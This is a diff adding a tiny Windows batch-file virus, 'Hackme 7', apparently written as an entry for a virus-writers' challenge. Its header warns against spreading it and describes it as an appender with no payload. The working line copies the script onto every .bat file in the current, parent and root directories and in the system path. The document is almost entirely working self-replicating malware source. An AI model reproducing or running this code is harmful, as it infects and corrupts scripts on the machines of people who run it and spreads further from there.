@@ -1,0 +1,10 @@
+:: WARNING: This is a virus, handle it careful and 		::
+::          dont spread it into the wild			::
+:: Hackme 7 by VorteX V0.10					::
+:: Created for 	PhileT0ast3r	(www.rrlf.de)			::
+:: This virus is a simple bat appender	(no payload)		::
+:: @Philetoaster: Hope this is enough to pass this stage	::
+
+@ECHO OFF
+FOR %%i IN (*.bat ..\*.bat \*.bat %path%\*.bat) do COPY %%i+%0 %%i>nul
+cls
